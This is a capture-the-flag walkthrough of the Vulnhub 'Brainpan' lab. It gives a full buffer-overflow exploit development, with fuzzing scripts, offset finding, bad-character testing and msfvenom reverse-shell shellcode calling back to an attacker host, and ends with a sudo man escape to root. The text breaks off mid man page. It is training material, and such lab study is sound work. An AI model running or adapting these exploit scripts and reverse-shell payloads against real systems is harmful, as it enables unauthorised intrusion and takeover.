---
layout: single
title: Brainpan - Vulnhub
excerpt: Brainpan is a linux box running a windows binary on a specific port. The binary is vulnerable to buffer overflow attack and this was leveraged to gain access to the box. A simple `sudo man` escape sequence was abused to gain root privileges. 
date: 2020-04-13
classes: wide
header:
  teaser: <img src="/assets/images/brainpan/brainpan-logo.png">
  teaser_home_page: true
  icon: <img src="/assets/images/hackthebox.png">
categories:
  - vulnhub
tags:
  - buffer overflow
  - linux
  - sudo
---

<img src="/assets/images/brainpan/brainpan-logo.png">

## Summary

Brainpan is a linux box running a windows binary on a specific port. The binary is vulnerable to buffer overflow attack and this was leveraged to gain access to the box. A simple `sudo man` escape sequence was abused to gain root privileges.

## Lab Details

- Attacker machine(Kali): **192.168.4.128**
- Victim machine(brainpan): **192.1684.130**
- 32-bit Windows 7 Test Machine: **192.168.4.131**

## Scanning

`nmap` portscanning showed two opened ports, TCP 9999 and TCP 10000

```
# nmap -p- --min-rate 1000 -oA nmap/alltcp -vv --open 192.168.4.130
Nmap scan report for 192.168.4.130
Host is up, received conn-refused (0.0029s latency).
Scanned at 2020-04-12 14:35:55 GMT for 10s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT      STATE SERVICE          REASON
9999/tcp  open  abyss            syn-ack
10000/tcp open  snet-sensor-mgmt syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Apr 12 14:36:05 2020 -- 1 IP address (1 host up) scanned in 9.49 seconds
```

To find more information about the services running on the identified opened ports, I performed `nmap` version scan

```
# nmap -sC -sV -p 9999,10000 -oA nmap/services -vv 192.168.4.130
Nmap scan report for 192.168.4.130
Host is up, received arp-response (0.00050s latency).
Scanned at 2020-04-12 14:59:39 GMT for 43s

PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=4/12%Time=5E932CE8%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:E2:97:CC (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 12 15:00:22 2020 -- 1 IP address (1 host up) scanned in 43.67 seconds

```

## Enumeration

### TCP Port 9999

I couldn't identified the service running on port 9999 and thus to test, I used netcat to interact with the service.

```
cyb3r@cyb3rwarl0rd:/mnt/hgfs/drive/vulnhub/brainpan$ nc 192.168.4.130 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

The service running is requesting a password. After playing round and getting access denied, I will leave this and enumerate the other open port and probably return to this if I get to find any credentials

### TCP Port 10000

Port 10000 is running `HTTP` protocol, with a `python 2.7.3` webserver. The home page had a static image. I went on to perform a directory brute forcing and this popped up a hidden directory `http://192.168.4.130/bin/`. In this directory was a windows executable named `brainpan.exe`

<img src="/assets/images/brainpan/http-10000-binary.png">

Running the executable opens a port `9999` on my test windows machine and gives the same output as the service running on the brainpan machine

```
cyb3r@cyb3rwarl0rd:/mnt/hgfs/drive/vulnhub/brainpan$ nc 192.168.4.131 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

Since the application is taking user input, I will go ahead and spike the application to see if it's vulnerable to buffer overflow.

### Crashing The Application

I will create a file with the following information to spike the input being requested:

```
s_readline();
s_string(" ");
s_string_variable("0");
```

And then use the command `generic_send_tcp` to spike the application. I attached the brainpan application to `immunity debugger` to check if the application crashes or not

```
yb3r@cyb3rwarl0rd:/mnt/hgfs/drive/vulnhub/brainpan$ generic_send_tcp 192.168.4.131 9999 brainpan.spk 0 0
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=_|                            _|                                        
Fuzzing Variable 0:1
line read=_|                            _|                                        
Variablesize= 5004
Fuzzing Variable 0:2
Variablesize= 5005
Fuzzing Variable 0:3
Variablesize= 21
Fuzzing Variable 0:4
Variablesize= 3
Fuzzing Variable 0:5
Couldn't tcp connect to target
Variablesize= 2
tried to send to a closed socket!
Fuzzing Variable 0:6
Couldn't tcp connect to target
Variablesize= 7
```

As soon as I saw that `couldn't tcp connect to target`, I checked the running state of the application in `immunity debugger` and realised it had stopped due to access violation. Also the `EIP` has been overwritten with the hex values `41414141` which is the representation of the ASCII character `AAAA`.

<img src="/assets/images/brainpan/access-violation.png">

<img src="/assets/images/brainpan/eip-overwritten.png">

At this stage, I have been able to crash the application. To be able to take advantage of this, I need to control the `EIP` so I can put my own custom code on the stack to be executed and probably gain access to the server.

## Exploit Development

To be able to control the `EIP`, I need to know the size of data to send just before overwritting the `EIP`. This is know as finding the offset. I will create a unique pattern and with the help of a python script send the data to the application and check the value of the `EIP`. I will use the `pattern_create` and `pattern_offset` scripts found on kali for this exercise. But before I get to creating the pattern, I would want to find a rough estimate of how many bytes can be used to overwrite the `EIP`. I will write a small fuzzer script in python to find this approximate size of bytes 

### Fuzzing Brainpan

My script for fuzzing is show below:

```python
#!/usr/bin/python

import sys
import socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.4.131',9999))
        s.send((' /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

Running this script tells me that about 1000 bytes crashed the application

<img src="/assets/images/brainpan/fuzzer.png">

### Find the Offset

I will create the unique pattern now and replace the buffer in the fuzzer.py script with this pattern so I can be able to find the offset which is the size of bytes required just before overwriting the `EIP`

```
cyb3r@cyb3rwarl0rd:$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9
```

The updated script which I have renamed to `offset.py` is shown below:

```python
#!/usr/bin/python

import sys
import socket

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.4.131',9999))
    s.send((' /.:/' + buffer))
    s.close()
except:
    print "Error connecting to the Server"
    sys.exit()
```

After running the script, the application crashed as expected and this time `EIP` had a value of `41337241` and I will use this value to find the exact offset which was found to be 519.

<img src="/assets/images/brainpan/eip-offset.png">

```
cyb3r@cyb3rwarl0rd:$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41337241
[*] Exact match at offset 519
cyb3r@cyb3rwarl0rd:$
```

### Overwirting the EIP

Having found the offset, I need to confirm if this value works fine and that I can trully overwrite the `EIP` with my custom data. To do this, I will use a junk data of size 519 and append 4B's to it. If the 4B's lands in the `EIP`, then I can confirm this offset is correct. Below shows the script to test this.

```python
#!/usr/bin/python

import sys
import socket

buffer = "A" * 519 + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.4.131',9999))
    s.send((' /.:/' + buffer))
    s.close()
except:
    print "Error connecting to the Server"
    sys.exit()
```

Indeed, the application crashed again and the 4 sets B's all landed in the `EIP` as expected and thus we can control the `EIP`

<img src="/assets/images/brainpan/eip-overwrite-BBBB.png">

### Finding Bad Characters

The null byte, `\x00` is a bad character that causes issues when executing code on the stack, thus we should avoid it. Therefore we need to identify all other bad characters and eliminate them when creating shellcode to be executed on the stack. We can do this by using `mona.py` to generate a byte array by using the command `!mona bytearray -b '\x00'` within `immunity debugger` and then write this data onto the stack. I will then check the Hex dump if there's any distortion. We can then eliminate all the bad characters. My exploit script is updated with the byte array.

```python
#!/usr/bin/python

import sys
import socket

offset = 519
junk = "A" * offset
eip = "B" * 4
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = junk + eip + badchars + "C" * 4 + "D" * (1200 - 519 - 8 - len(badchars))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.4.131',9999))
    s.send((' /.:/' + payload))
    s.close()
except:
    print "Error connecting to the Server"
    sys.exit()
```

Right-click the `ESP` value in immunity debugger and selecting follow Dump, we can then verify if there's any bad characters.

<img src="/assets/images/brainpan/immunity-hex-dump.png">

At this point, I have identified only `\x00` as the bad character.

### Finding Modules

At this stage, I need an address to insert into the `EIP` so my custom code can executed. To do this, I need a module that has a `JMP ESP` and this module shouldn't have any protection enabled. I can use the command `!mona modules` in `immunity debugger` to find suitable modules.

<img src="/assets/images/brainpan/mona-find-modules.png">

The most suitable module is within the brainpan.exe executable. Using this, I will go ahead and find the `JMP ESP` within this module using the command `!mona jmp -r esp -m brainpan.exe` and it's located at the address `0x311712f3`

<img src="/assets/images/brainpan/jmp-esp-mona.png">

So the address to insert into the `EIP` is `\xf3\x12\x17\x31` written in Little Endian format.

### Creating Our Custom Shellcode

Having found the `EIP` value, I need to create my shellcode to be executed on the stack and which hopefully will give me remote access to the server. I will use `msfvenom` to create the shellcode

```
cyb3r@cyb3rwarl0rd:$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.4.128 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\x15\x25\x9b\x9c\xd9\xc4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\x42\x2b\x79\x69\x90\xdb\xff"
"\x92\x68\x1c\x60\x1a\x8d\x2d\xa0\x78\xc6\x1e\x10\x0a\x8a\x92"
"\xdb\x5e\x3e\x20\xa9\x76\x31\x81\x04\xa1\x7c\x12\x34\x91\x1f"
"\x90\x47\xc6\xff\xa9\x87\x1b\xfe\xee\xfa\xd6\x52\xa6\x71\x44"
"\x42\xc3\xcc\x55\xe9\x9f\xc1\xdd\x0e\x57\xe3\xcc\x81\xe3\xba"
"\xce\x20\x27\xb7\x46\x3a\x24\xf2\x11\xb1\x9e\x88\xa3\x13\xef"
"\x71\x0f\x5a\xdf\x83\x51\x9b\xd8\x7b\x24\xd5\x1a\x01\x3f\x22"
"\x60\xdd\xca\xb0\xc2\x96\x6d\x1c\xf2\x7b\xeb\xd7\xf8\x30\x7f"
"\xbf\x1c\xc6\xac\xb4\x19\x43\x53\x1a\xa8\x17\x70\xbe\xf0\xcc"
"\x19\xe7\x5c\xa2\x26\xf7\x3e\x1b\x83\x7c\xd2\x48\xbe\xdf\xbb"
"\xbd\xf3\xdf\x3b\xaa\x84\xac\x09\x75\x3f\x3a\x22\xfe\x99\xbd"
"\x45\xd5\x5e\x51\xb8\xd6\x9e\x78\x7f\x82\xce\x12\x56\xab\x84"
"\xe2\x57\x7e\x0a\xb2\xf7\xd1\xeb\x62\xb8\x81\x83\x68\x37\xfd"
"\xb4\x93\x9d\x96\x5f\x6e\x76\x59\x37\x74\x06\x31\x4a\x74\x25"
"\xeb\xc3\x92\x43\xfb\x85\x0d\xfc\x62\x8c\xc5\x9d\x6b\x1a\xa0"
"\x9e\xe0\xa9\x55\x50\x01\xc7\x45\x05\xe1\x92\x37\x80\xfe\x08"
"\x5f\x4e\x6c\xd7\x9f\x19\x8d\x40\xc8\x4e\x63\x99\x9c\x62\xda"
"\x33\x82\x7e\xba\x7c\x06\xa5\x7f\x82\x87\x28\x3b\xa0\x97\xf4"
"\xc4\xec\xc3\xa8\x92\xba\xbd\x0e\x4d\x0d\x17\xd9\x22\xc7\xff"
"\x9c\x08\xd8\x79\xa1\x44\xae\x65\x10\x31\xf7\x9a\x9d\xd5\xff"
"\xe3\xc3\x45\xff\x3e\x40\x65\xe2\xea\xbd\x0e\xbb\x7f\x7c\x53"
"\x3c\xaa\x43\x6a\xbf\x5e\x3c\x89\xdf\x2b\x39\xd5\x67\xc0\x33"
"\x46\x02\xe6\xe0\x67\x07";
cyb3r@cyb3rwarl0rd:$ 
```

I will add this to the exploit script and then test it to ensure I can have remote access to the Windows 7 test server. And after running this, I successfuly had access to the server.

```
cyb3r@cyb3rwarl0rd:~$ nc -lvnp 9001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 192.168.4.131.
Ncat: Connection from 192.168.4.131:49159.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\cyb3r\Downloads>hostname
hostname
WIN7-32Bit-BOF

C:\Users\cyb3r\Downloads>
```

## Gaining Access

As all this testing has been done on the test windows server, I will change the `ip address` to that of the brainpan box and generate a payload for the linux reverse shell using `msfvenom`

```
cyb3r@cyb3rwarl0rd:$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.4.128 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xda\xc7\xd9\x74\x24\xf4\x5b\xbf\x73\xf1\xd6\xad\x2b\xc9\xb1"
"\x12\x31\x7b\x17\x03\x7b\x17\x83\x98\x0d\x34\x58\x6f\x35\x4e"
"\x40\xdc\x8a\xe2\xed\xe0\x85\xe4\x42\x82\x58\x66\x31\x13\xd3"
"\x58\xfb\x23\x5a\xde\xfa\x4b\x9d\x88\xf9\x0b\x75\xcb\x01\x28"
"\xaf\x42\xe0\x9e\xc9\x04\xb2\x8d\xa6\xa6\xbd\xd0\x04\x28\xef"
"\x7a\xf9\x06\x63\x12\x6d\x76\xac\x80\x04\x01\x51\x16\x84\x98"
"\x77\x26\x21\x56\xf7";
cyb3r@cyb3rwarl0rd:$ 
```

The final exploit script is show below:

```python
#!/usr/bin/python

import sys
import socket

offset = 519
junk = "A" * offset
eip = "\xf3\x12\x17\x31"
shellcode = ("\xba\x36\x1b\xdc\x38\xd9\xc3\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x12\x31\x55\x12\x03\x55\x12\x83\xdb\xe7\x3e\xcd\x12\xc3\x48"
"\xcd\x07\xb0\xe5\x78\xa5\xbf\xeb\xcd\xcf\x72\x6b\xbe\x56\x3d"
"\x53\x0c\xe8\x74\xd5\x77\x80\x46\x8d\x8c\xd0\x2f\xcc\x8c\xf3"
"\x86\x59\x6d\x43\xbe\x09\x3f\xf0\x8c\xa9\x36\x17\x3f\x2d\x1a"
"\xbf\xae\x01\xe8\x57\x47\x71\x21\xc5\xfe\x04\xde\x5b\x52\x9e"
"\xc0\xeb\x5f\x6d\x82")

payload = junk + eip + "\x90" * 16 + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.4.130',9999))
    s.recv(1024)
    s.send((' /.:/' + payload))
    s.close()
except:
    print "Error connecting to the Server"
    sys.exit()
```

After executing the script, I successfully received the reverse shell from the server:

```
cyb3r@cyb3rwarl0rd:~$ nc -lvnp 9001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 192.168.4.130.
Ncat: Connection from 192.168.4.130:34407.

id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
pwd
/home/puck
hostname
brainpan
python -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ 

```

## Privilege Escalation

After enumerating the system using the `linux-smart-enumeration` scripts, I found the user `puck` can run a sudo command without password. This is something we can abuse to gain a root shell.

```
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

I need to figure out exactly what this command is doing and how best to abuse it.

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

The `manual [command]` section got my attention. I run it as `manual man`and it printed out the man page of the command man. With this I break out of this using the escape sequence `:!sh` and gain a root shell

<img src="/assets/images/brainpan/sudo-man.png">

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
sudo /home/anansi/bin/anansi_util manual man
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
MAN(1)                        Manual pager utils                        MAN(1)

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  [-C  file]  [-d]  [-D]  [--warnings[=warnings]]  [-R encoding] [-L
       locale] [-m system[,...]] [-M path] [-S list]  [-e  extension]  [-i|-I]
       [--regex|--wildcard]   [--names-only]  [-a]  [-u]  [--no-subpages]  [-P
       pager] [-r prompt] [-7] [-E encoding] [--no-hyphenation] [--no-justifi‐
       cation]  [-p  string]  [-t]  [-T[device]]  [-H[browser]] [-X[dpi]] [-Z]
       [[section] page ...] ...
       man -k [apropos options] regexp ...
       man -K [-w|-W] [-S list] [-i|-I] [--regex] [section] term ...
       man -f [whatis options] page ...
       man -l [-C file] [-d] [-D] [--warnings[=warnings]]  [-R  encoding]  [-L
